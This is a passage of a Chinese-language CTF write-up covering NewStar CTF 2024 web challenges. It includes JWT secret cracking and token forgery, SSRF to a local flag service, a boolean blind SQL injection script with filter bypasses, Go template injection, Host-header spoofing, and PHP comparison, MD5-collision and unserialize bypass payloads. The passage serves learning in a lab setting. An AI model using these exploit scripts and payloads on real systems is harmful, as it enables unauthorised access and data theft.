make_response(<span class="string">&quot;Not found!&quot;</span>, <span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&quot;./static/&quot;</span> + file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>分析源代码发现这里用了JWT令牌进行身份验证，而且密钥只有六位数字！！完全可以爆破。</p><p>这里还给了一个用户名和密码，直接用提供的用户账号登进去，获取一个token样例</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph6.png" class=""><p>用JWTcrack破解密钥</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph8.png" class=""><p>用在线JWT生成来伪造令牌，<em>注意这里的exp里包含了令牌的有效时间，可以通过把数字加大来延长有效时间</em></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph10.png" class=""><p>成功伪造admin身份</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph11.png" class=""><p>管理员面板给了一个api，可以访问本地链接，那么应该有一个SSRF漏洞在这里，但是在哪呢？</p><p>继续分析源代码，发现一个奇怪的地方</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph12.png" class=""><p>可见这里导入了一个自定义库，那应该就是在与app.py的同目录下有一个flag.py</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph14.png" class=""><p>得到内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random_number_string</span>(<span class="params">length</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">9</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length)])</span><br><span class="line"></span><br><span class="line">get_flag = Flask(<span class="string">&quot;get_flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">FLAG = os.environ.pop(<span class="string">&quot;ICQ_FLAG&quot;</span>, <span class="string">&quot;flag&#123;test_flag&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@get_flag.route(<span class="params"><span class="string">&quot;/fl4g&quot;</span></span>)</span></span><br><span class="line"><span class="comment">#如何触发它呢?</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">return</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag.run(host=<span class="string">&quot;127.0.0.1&quot;</span>,port=<span class="number">5001</span>)</span><br></pre></td></tr></table></figure><p>直接用管理员面板访问5001端口的&#x2F;fl4g即可</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph15.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph16.png" class=""><h2 id="臭屁踩踩背"><a href="#臭屁踩踩背" class="headerlink" title="臭屁踩踩背"></a>臭屁踩踩背</h2><p>西电终端的环境坏了，写不了，这里放一下官方题解的链接【讲的很好，强推！！！】</p><p><a href="https://ctf.xidian.edu.cn/training/14?challenge=620&tab=answer">NewStar CTF 2024 - 西电 CTF 终端</a></p><h2 id="blindsql1"><a href="#blindsql1" class="headerlink" title="blindsql1"></a>blindsql1</h2><p>sqlmap不会用，以前从来没有手敲过盲注脚本，这里就简单记一下题解的脚本，以后当模板用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests,string,time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Bruting at <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.ascii_letters + string.digits + <span class="string">&#x27;_-&#123;&#125;&#x27;</span>:</span><br><span class="line">        time.sleep(<span class="number">0.2</span>) <span class="comment"># 限制速率，防止请求过快</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Trying:&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 这条语句能查询到当前数据库所有的表名</span></span><br><span class="line">        tables = <span class="string">f&#x27;(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取所有表名的第 i 个字符，并计算 ascii 值</span></span><br><span class="line">        char = <span class="string">f&#x27;(ord(mid(<span class="subst">&#123;tables&#125;</span>,<span class="subst">&#123;i&#125;</span>,1)))&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 爆破该 ascii 值</span></span><br><span class="line">        b = <span class="string">f&#x27;((<span class="subst">&#123;char&#125;</span>)in(<span class="subst">&#123;<span class="built_in">ord</span>(c)&#125;</span>))&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 若 ascii 猜对了，则 and 后面的结果是 true，会返回 Alice 的数据</span></span><br><span class="line">        p = <span class="string">f&#x27;Alice\&#x27;and(<span class="subst">&#123;b&#125;</span>)#&#x27;</span></span><br><span class="line"></span><br><span class="line">        res = requests.get(url, params=&#123;<span class="string">&#x27;student_name&#x27;</span>: p&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Alice&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*]bingo:&#x27;</span>,c)</span><br><span class="line">            result += c</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><code>union</code> 被禁用，说明此时该使用盲注，我们能够通过插入 <code>and 1</code> 或者 <code>and 0</code> 来控制是否返回数据，由此可以使用布尔盲注</p><p><code>=</code> 的绕过可以使用 <code>like</code> 或者 <code>in</code> 代替</p><p>空格和斜杠 <code>/</code> 被禁用，可以使用括号代替</p><h1 id="Week-4"><a href="#Week-4" class="headerlink" title="Week 4"></a>Week 4</h1><h2 id="Pangbai过家家（4）"><a href="#Pangbai过家家（4）" class="headerlink" title="Pangbai过家家（4）"></a>Pangbai过家家（4）</h2><p>打开发现这么一个东西，问了问AI，是Go语言的SSTI，于是赶紧去学了一下Go语言SSTI相关的东西</p><p><img src="/2024NewStarCTF-WP-Web/p4_0.png"></p><p>相关文章：<a href="https://blog.csdn.net/Elite__zhb/article/details/134352384">[Go语言]SSTI从0到1_go ssti-CSDN博客</a></p><p><img src="/2024NewStarCTF-WP-Web/p4.png"></p><p>分析给我们的源代码，可知当前对象是helper，有两个成员结构体，我们要看的Config，因为Config给了我JWT的key，不用往下翻就知道待会儿设计cookie伪造。</p><p><img src="/2024NewStarCTF-WP-Web/p4_2.png"></p><p>拿到密钥，直接丢到在线平台伪造。（<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a>，这个好使）</p><p><img src="/2024NewStarCTF-WP-Web/p4_4.png"></p><p><img src="/2024NewStarCTF-WP-Web/p4_3.png"></p><p>继续往下看可以看到一个文件读取函数，应该是任意文件读取漏洞，读的是config.SignaturePath的内容，要想办法对内容进行篡改。</p><p><img src="/2024NewStarCTF-WP-Web/p4_8.png"></p><p>相关代码在这里，可见要用PUT方法，而且要求IP为本机。把要修改的路径放在包的主体即可。</p><p><img src="/2024NewStarCTF-WP-Web/p4_6.png"></p><p><img src="/2024NewStarCTF-WP-Web/p4_7.png"></p><p>这里我们直接改包，然后加一个报头Host，设置为本机。读取环境变量文件。</p><img src="2024NewStarCTF-WP-Web/p4_9.png" title="" alt="" data-align="center"><p><img src="/2024NewStarCTF-WP-Web/p4_10.png"></p><h2 id="chocolate"><a href="#chocolate" class="headerlink" title="chocolate"></a>chocolate</h2><p>首先进行目录扫描，扫出一个文件</p><p><img src="/2024NewStarCTF-WP-Web/cho1.png"></p><p><img src="/2024NewStarCTF-WP-Web/cho2.png"></p><p>根据文件内容转到相应页面</p><p><img src="/2024NewStarCTF-WP-Web/cho3.png"></p><p>这里要求传入一个字符串，其中包含字符0，不含字母，且要求整数化等于1337。一开始的思路是直接传入八进制的0</p><p>2471，这样intval函数会将其识别为八进制并自动转化为十进制整数1337，</p><p>但是由于这里0在第一位，对应索引号为0，strops返回0，则！strpos的判断结果为真，导致die掉</p><p>所以这里还需要在02471前加一个空格，（%20是空格的url编码）</p><p><img src="/2024NewStarCTF-WP-Web/cho4.png"></p><p><img src="/2024NewStarCTF-WP-Web/cho5.png"></p><p>成功拿到信息，除了给出一个成分之外，还给了一串字符，让我们对其解密</p><p>询问deepseek发现是ROT13加密，对其进行解密</p><p><img src="/2024NewStarCTF-WP-Web/cho6.png"></p><p>得到下一个路径</p><p><img src="/2024NewStarCTF-WP-Web/cho7.png"></p><p>首先，get传入两个参数，要求其md5相同</p><p>由于是强比较，而且过滤了数组，所以只能上网去找强碰撞的字符</p><p><a href="https://blog.csdn.net/m0_73818134/article/details/131793815">md5强比较的几种绕过，强碰撞，shal强比较的几种绕过，强碰撞_md5强比较绕过-CSDN博客</a></p><p>在这里找到一组满足条件的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;dog=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure><p>下一步是post传入一个参数，要求其自身与自身的md5弱相等</p><p>这不是传统的弱相等，传统的题只需要找一个开头为字母且md5为0e开头的字符串即可</p><p>但这方法在本题行不通，因为这题的php版本是8</p><p><img src="/2024NewStarCTF-WP-Web/cho8.png"></p><p><a href="https://blog.csdn.net/qq_44879989/article/details/133230251">PHP 变动：PHP 8 版本下字符串与数值的弱比较_php 隐式转换比较-CSDN博客</a></p><p><img src="/2024NewStarCTF-WP-Web/cho10.png"></p><p>所以只能找数值字符串，也就是本身是0e开头，md5后仍是0e开头</p><p>这样的字符串也不少，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br></pre></td></tr></table></figure><p>最后一步，传入一个字符串，其md5以8031b开头</p><p>这也是一个强比较，没有办法，只能写脚本尝试碰撞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(random.randint(<span class="number">1000000</span>,<span class="number">9999999</span>))  <span class="comment">#其实相比随机数，用for in range穷尽会更好，因为可以指导判断是否能在这个范围找到</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">s</span>) :</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    tar=<span class="string">&quot;8031b&quot;</span>   <span class="comment">#寻找以8031b为开头的md5的字符串</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        strs=generate()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] testing on <span class="subst">&#123;strs&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> encode(strs.encode()).startswith(tar) :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Found!&quot;</span>,strs)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/2024NewStarCTF-WP-Web/cho12.png"></p><p>传入参数获取信息</p><p><img src="/2024NewStarCTF-WP-Web/cho11.png"></p><p>接下来进入最后的挑战（烦死这个套娃了）</p><p><img src="/2024NewStarCTF-WP-Web/cho13.png"></p><p>参数的传入是通过input伪协议，只要把要传入的内容直接写在post主体就好了</p><p>这里需要传入一个序列化之后的chocolate对象，虽然加了一个正则检测，但是其实好像没有什么用</p><p>就算触发错误，析构函数仍然会执行，我们仍然可以得到想要的信息</p><p>而且绕过也很简单，大小写绕过就好</p><p><img src="/2024NewStarCTF-WP-Web/cho15.png"></p><p>传入即可得到最后的信息</p><p>但是我找了半天，也找不到糖在哪，看了提示之后才知道这个要自己试</p><p><img src="/2024NewStarCTF-WP-Web/cho16.png"></p><p>随便填一个糖分</p><p><img src="/2024NewStarCTF-WP-Web/cho17.png"></p><p>从这里可以看到填的数字低了，如果填的数字太大，会显示太甜了</p><p>那就好办了，直接二分法把正确的糖分试出来，最后发现是2042</p><p><img src="/2024NewStarCTF-WP-Web/cho18.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
